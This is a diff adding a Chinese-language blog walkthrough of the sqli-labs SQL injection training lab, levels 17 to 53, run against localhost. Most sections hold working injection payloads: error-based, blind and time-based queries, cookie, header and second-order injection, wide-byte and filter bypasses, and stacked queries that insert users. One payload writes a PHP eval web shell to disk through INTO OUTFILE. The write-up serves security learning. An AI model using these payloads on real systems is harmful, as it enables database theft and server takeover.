@@ -616,6 +616,360 @@ ps:在win下，路径是\分隔，但是由于是在url中，\会被认定为转
 
 <h2 id="less-17">less-17</h2>
 
+<p>一个更新数据的地方，尝试输入username=admin newpassword=&rsquo; 报错 发现user是单引号包裹  也就是单引号闭合</p>
+
+<p>然后在newpassword处构建注入语句  比如布尔盲注</p>
+
+<pre><code>uname=admin&amp;passwd=' and length(database())=8#&amp;submit=Submit
+</code></pre>
+
+<p>比如 报错盲注</p>
+
+<pre><code>uname=admin&amp;passwd=' and extractvalue(1,concat(user()))#&amp;submit=Submit
+</code></pre>
+
+<p>附：<a href="http://www.cnblogs.com/lcamry/p/5763042.html">常用的报错盲注</a></p>
+
+<p>至于为啥不在uname处进行注入，查看源代码可以看到，源代码对uname进行了一个处理</p>
+
+<h2 id="less-18">less-18</h2>
+
+<p>查看源代码可以看到，对我们输入的usernam和password都进行了check处理，但是可以看到一个insert语句</p>
+
+<pre><code>INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES ('$uagent', '$IP', $uname)
+</code></pre>
+
+<p>可以在uagent处构建注入语句</p>
+
+<pre><code>INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES ('1' and extractvalue(1,concat(user())) and '1'='1', '$IP', $uname)
+</code></pre>
+
+<h2 id="less-19">less-19</h2>
+
+<p>在refere处构建注入语句，跟18一样</p>
+
+<h2 id="less-20">less-20</h2>
+
+<p>从源码中可以看到，当第一访问时会设置一个包含uname的cookie，当再次访问时会从cookie中获取uname值，构造cookie</p>
+
+<pre><code>Cookie: uname=' union select 1,2,user()#; _ga=GA1.1.208750863.1521028790  
+</code></pre>
+
+<p>或</p>
+
+<pre><code>Cookie: uname=admin' and extractvalue(1,concat(user()))#; _ga=GA1.1.208750863.1521028790
+</code></pre>
+
+<h2 id="less-21">less-21</h2>
+
+<p>跟20差不多，闭合变成了&rsquo;),再就是把username base64加密了 只需把payload语句进行一下加密就行</p>
+
+<pre><code>Cookie: uname=Cookie: uname=admin' and extractvalue(1,concat(user()))#; _ga=GA1.1.208750863.1521028790; _ga=GA1.1.208750863.1521028790
+</code></pre>
+
+<h2 id="less-22">less-22</h2>
+
+<p>双引号闭合，其他跟20一样</p>
+
+<pre><code>Cookie: uname=YWRtaW4iIGFuZCBleHRyYWN0dmFsdWUoMSxjb25jYXQodXNlcigpKSkj; _ga=GA1.1.208750863.1521028790
+</code></pre>
+
+<h2 id="less-23">less-23</h2>
+
+<p>把#和&ndash;替换成空</p>
+
+<p>可以使用报错注入</p>
+
+<pre><code>http://127.0.0.1/sql/Less-23/?id=1%27%20and%20updatexml(1,concat(0x7e,version()),1)%20and%20%271%27=%271
+</code></pre>
+
+<h2 id="less-24">less-24</h2>
+
+<p>本关为二次排序注入的示范例。二次排序注入也成为存储型的注入，就是将可能导致sql注入的字符先存入到数据库中，当再次调用这个恶意构造的字符时，就可以出发sql注入。二次排序注入思路：</p>
+
+<ol>
+<li><p>黑客通过构造数据的形式，在浏览器或者其他软件中提交HTTP数据报文请求到服务端进行处理，提交的数据报文请求中可能包含了黑客构造的SQL语句或者命令。</p></li>
+
+<li><p>服务端应用程序会将黑客提交的数据信息进行存储，通常是保存在数据库中，保存的数据信息的主要作用是为应用程序执行其他功能提供原始输入数据并对客户端请求做出响应。</p></li>
+
+<li><p>黑客向服务端发送第二个与第一次不相同的请求数据信息。</p></li>
+
+<li><p>服务端接收到黑客提交的第二个请求信息后，为了处理该请求，服务端会查询数据库中已经存储的数据信息并处理，从而导致黑客在第一次请求中构造的SQL语句或者命令在服务端环境中执行。</p></li>
+
+<li><p>服务端返回执行的处理结果数据信息，黑客可以通过返回的结果数据信息判断二次注入漏洞利用是否成功。</p></li>
+</ol>
+
+<p>此例子中我们的步骤是注册一个admin&rsquo;#的账号，接下来登录该帐号后进行修改密码。此时修改的就是admin的密码。</p>
+
+<p>Sql语句变为UPDATE users SET passwd=&ldquo;New_Pass&rdquo; WHERE username =&rsquo; admin&rsquo; # &lsquo; AND password=&rsquo; ，也就是执行了UPDATE users SET passwd=&ldquo;New_Pass&rdquo; WHERE username =&rsquo; admin&rsquo;</p>
+
+<h2 id="less-25">less-25</h2>
+
+<p>过滤了or和and 双写绕过</p>
+
+<pre><code>http://127.0.0.1/sql/Less-25/?id=1%27%20anandd%20extractvalue(1,concat(0x7e,user()))%23
+</code></pre>
+
+<h2 id="less-25a">less-25a</h2>
+
+<p>查看源代码可以看到，整形无闭合，关闭了错误回显，所以无法使用报错</p>
+
+<pre><code>http://127.0.0.1/sql/Less-25a/?id=-1%20union%20select%201,2,user()%23
+</code></pre>
+
+<h2 id="less-26">less-26</h2>
+
+<p>过滤了or and / * &ndash; # 空格 \</p>
+
+<p>使用()代替空格</p>
+
+<pre><code>http://127.0.0.1/sql/Less-26/?id=1%27anandd(updatexml(1,concat(0x7e,user()),1))%20anandd%20%271%27=%271
+</code></pre>
+
+<h2 id="less-26a">less-26a</h2>
+
+<p>闭合方式变了而已 其他没变</p>
+
+<h2 id="less-27">less-27</h2>
+
+<p>过滤了/ * &ndash; # 空格 + select union UNION SELECT Union Select</p>
+
+<pre><code>http://127.0.0.1/sql/Less-27/?id=1%27and(updatexml(1,concat(0x7e,user()),1))and%271%27=%271
+
+http://127.0.0.1/sql/Less-27/?id=1%27and(updatexml(0,concat(0x7e,(SElECT(concat(table_name))FROM(information_schema.tables)WHERE(table_schema=database())limit%0d0,1)),0))and%271%27=%271
+
+</code></pre>
+
+<h2 id="less-27a">less-27a</h2>
+
+<p>区别在于关闭了错误回显以及闭合方式的改变  双引号闭合 无法使用报错注入</p>
+
+<pre><code>http://127.0.0.1/sql/Less-27a/?id=1&quot;order%0aby%0a3;%00
+
+http://127.0.0.1/sql/Less-27a/?id=a%22UniOn%0asElect%0a1,2,group_concat(schema_name)%0afrom%0ainformation_schema.schemata;%00
+</code></pre>
+
+<h2 id="less-28">less-28</h2>
+
+<p>过滤了/ * &ndash; # 空格 + 以及</p>
+
+<pre><code>$id= preg_replace('/union\s+select/i',&quot;&quot;, $id); 
+</code></pre>
+
+<p>布尔盲注</p>
+
+<pre><code>http://127.0.0.1/sql/Less-28/?id=1%27)%0aand%0amid((select%0atable_name%0afrom%0a%0ainformation_schema.tables%0awhere%0atable_schema=database()%0alimit%0a0,1),1,1)=%27e%27;%00
+</code></pre>
+
+<p>网上说unino%a0select以及union/<em>%aa</em>/select也能绕过,但是我不行啊，，，</p>
+
+<h2 id="less-28a">less-28a</h2>
+
+<p>这次只是过滤了union select组合，可以用内联注释分隔关键词 绕过</p>
+
+<pre><code>http://127.0.0.1/sql/Less-28a/?id=1%27)%20union/**/select%201,2,user()%23
+</code></pre>
+
+<h2 id="less-29">less-29</h2>
+
+<p>无过滤</p>
+
+<pre><code>http://127.0.0.1/sql/Less-29/?id=a%27union%20select%201,2,user()%23
+</code></pre>
+
+<p>但是报错注入用不了，，</p>
+
+<h2 id="less-30">less-30</h2>
+
+<p>双引号</p>
+
+<pre><code>http://127.0.0.1/sql/Less-30/?id=a%22union%20select%201,2,user()%23
+</code></pre>
+
+<h2 id="less-31">less-31</h2>
+
+<p>双引号+括号</p>
+
+<pre><code>http://127.0.0.1/sql/Less-31/?id=a%22)union%20select%201,2,user()%23
+</code></pre>
+
+<h2 id="less-32">less-32</h2>
+
+<p>宽字节注入</p>
+
+<p>查看源代码，可以看到转义了&rsquo;&ldquo;/ 也就是&rsquo;=&gt;\&rsquo; &ldquo;=&gt;\&rdquo; \=&gt;\ 但是</p>
+
+<pre><code>mysql_query(&quot;SET NAMES gbk&quot;);
+</code></pre>
+
+<p>也就是使用gbk方式把数据写入数据库，首先在gbk编码中，一个汉字占2个字节，在utf-8中一个汉字占3个字节</p>
+
+<p>所以当我们输入%df&rsquo;时，%df这个字节和\一起被gbk认为是一个汉字 当然被认为是汉字的前提是前一个值的ascii大于128，然后&rsquo;就逃出来了</p>
+
+<p>在宽字节注入有一点要注意的就是，由于&rsquo;被转义了，所以当我们标识数据库名数据列名时需要16进制转化 这里只需要将users转化成16进制就行，无需带&rdquo;</p>
+
+<pre><code>http://127.0.0.1/sql/Less-32/?id=a%df%27union%20select%201,2,(select%20group_concat(column_name)%20from%20information_schema.columns%20where%20table_schema=database()%20and%20table_name=0x7573657273)%23
+</code></pre>
+
+<h2 id="less-33">less-33</h2>
+
+<p>跟32没太大区别</p>
+
+<h2 id="less-34">less-34</h2>
+
+<p>post型的宽字节注入</p>
+
+<pre><code>�' and updatexml(1,concat(0x7e,user()),1)#
+</code></pre>
+
+<h2 id="less-35">less-35</h2>
+
+<p>和32的区别在于没有对id进行包裹，也就无需闭合</p>
+
+<pre><code>http://127.0.0.1/sql/Less-35/?id=-1%20union%20select%201,2,user()%23
+</code></pre>
+
+<p>但是有一个问题就是 当把id=a或其他字符时会报错，有点迷</p>
+
+<h2 id="less-36">less-36</h2>
+
+<pre><code>http://127.0.0.1/sql/Less-36/?id=a%df%27union%20select%201,user(),version()%23
+</code></pre>
+
+<h2 id="less-37">less-37</h2>
+
+<p>跟34区别不大</p>
+
+<pre><code>�' and updatexml(1,concat(0x7e,user()),1)#
+</code></pre>
+
+<h2 id="less-38">less-38</h2>
+
+<p>堆叠注入，不知道意义何在，，，</p>
+
+<pre><code>http://127.0.0.1/sql/Less-38/?id=1%27;insert%20into%20users(id,username,password)%20values%20(%2720%27,%27test%27,%27test%27)%23
+</code></pre>
+
+<h2 id="less-39">less-39</h2>
+
+<pre><code>http://127.0.0.1/sql/Less-39/?id=1;insert%20into%20users(id,username,password)%20values%20(%2716%27,%27test%27,%27test%27)%23
+</code></pre>
+
+<h2 id="less-40">less-40</h2>
+
+<pre><code>http://127.0.0.1/sql/Less-40/?id=1%27);insert%20into%20users(id,username,password)%20values%20(%2716%27,%27test%27,%27test%27)%23
+</code></pre>
+
+<h2 id="less-41">less-41</h2>
+
+<pre><code>http://127.0.0.1/sql/Less-41/?id=2;insert%20into%20users(id,username,password)%20values%20(%2716%27,%27test%27,%27test%27)%23
+</code></pre>
+
+<h2 id="less-42">less-42</h2>
+
+<p>从源码中可以看到，对传入的username进行了一个mysqli_real_escape_string处理，password则没有，所以可以在password处构建payload</p>
+
+<pre><code>username :1
+password :1';insert into users (id,username,password) values('16','test','test');
+</code></pre>
+
+<h2 id="less-43">less-43</h2>
+
+<p>闭合方式变了</p>
+
+<pre><code>username :1
+password :1');insert into users (id,username,password) values('16','test','test');
+</code></pre>
+
+<h2 id="less-44">less-44</h2>
+
+<p>与42相比关掉了错误回显</p>
+
+<pre><code>username :1
+password :1';insert into users (id,username,password) values('16','test','test');
+</code></pre>
+
+<h2 id="less-45">less-45</h2>
+
+<p>与43相比关掉了错误回显</p>
+
+<pre><code>username :1
+password :1');insert into users (id,username,password) values('16','test','test');
+</code></pre>
+
+<h2 id="less-46">less-46</h2>
+
+<p>Order By 注入</p>
+
+<p>order by后面的数字可以作为一个注入点，可以利用and</p>
+
+<pre><code>http://127.0.0.1/sql/Less-46/?sort=1%20and%20(select%20updatexml(1,concat(0x7e,mid((select%20group_concat(username)%20from%20security.users),1,31)),1))
+</code></pre>
+
+<p>可以使用(select &hellip;.)</p>
+
+<pre><code>http://127.0.0.1/sql/Less-46/?sort=(select%20count(*)%20from%20information_schema.columns%20group%20by%20concat(0x7e,(select%20user()),0x7e,floor(rand(0)*2)))
+</code></pre>
+
+<p>也可以直接挂马</p>
+
+<pre><code>http://127.0.0.1/sql/Less-46/?sort=1%20into%20outfile%20%27E:/wamp/wamp/www/1.php%27%20lines%20terminated%20by%200x3c3f70687020406576616c28245f504f53545b615d293b3f3e
+</code></pre>
+
+<p>盲注,利用rand(true)和rand(false)返回结果不同盲注</p>
+
+<pre><code>http://127.0.0.1/sql/Less-46/?sort=rand(true)
+http://127.0.0.1/sql/Less-46/?sort=rand(false)
+</code></pre>
+
+<p>ETC&hellip;</p>
+
+<h2 id="less-47">less-47</h2>
+
+<p>测试1&rsquo; 返回错误  1&rdquo;返回正常  单引号闭合</p>
+
+<pre><code>http://127.0.0.1/sql/Less-47/?sort=1%27and%20if(ascii(mid(database(),1,1))=115,0,sleep(5))--+
+</code></pre>
+
+<h2 id="less-48">less-48</h2>
+
+<p>关掉了错误回显  其他跟46一样</p>
+
+<h2 id="less-49">less-49</h2>
+
+<p>无错误回显，单引号闭合</p>
+
+<pre><code>http://127.0.0.1/sql/Less-49/?sort=1%27%20and%20if(ascii(mid(database(),1,1))=111,0,sleep(5))%23
+</code></pre>
+
+<h2 id="less-50">less-50</h2>
+
+<p>与46区别在于，50使用mysqli_multi_query($con1, $sql)查询，可以查询多条语句，46只能查询1条</p>
+
+<p>46方法同样可以在50使用</p>
+
+<pre><code>http://127.0.0.1/sql/Less-50/?sort=1;insert%20into%20users%20(id,username,password)%20values(%2716%27,%27test%27,%27test%27);
+</code></pre>
+
+<h2 id="less-51">less-51</h2>
+
+<pre><code>http://127.0.0.1/sql/Less-51/?sort=1%27;insert%20into%20users%20(id,username,password)%20values(%2716%27,%27test%27,%27test%27);%27
+</code></pre>
+
+<h2 id="less-52">less-52</h2>
+
+<pre><code>http://127.0.0.1/sql/Less-52/?sort=1;insert%20into%20users%20(id,username,password)%20values(%2716%27,%27test%27,%27test%27);%27
+</code></pre>
+
+<h2 id="less-53">less-53</h2>
+
+<pre><code>http://127.0.0.1/sql/Less-53/?sort=1%27;insert%20into%20users%20(id,username,password)%20values(%2716%27,%27test%27,%27test%27);%27
+</code></pre>
+
+<hr />
+
+<p>后续的挑战，不打算更了，算是完结了</p>
+
   
 <div class="prev-next-post pure-g">
   <div class="pure-u-1-24" style="text-align: left;">
@@ -673,7 +1027,7 @@ ps:在win下，路径是\分隔，但是由于是在url中，\会被认定为转
 
 
 
-<script type="text/javascript" color="0,0,255" opacity='0.7' zIndex="-2" count="99" src="//cdn.bootcss.com/canvas-nest.js/1.0.1/canvas-nest.min.js"></script>
+<script type="text/javascript" color="0,0,255" opacity='0.5' zIndex="-1" count="150" src="//cdn.bootcss.com/canvas-nest.js/1.0.1/canvas-nest.min.js"></script>
 
 </body>
 </html>
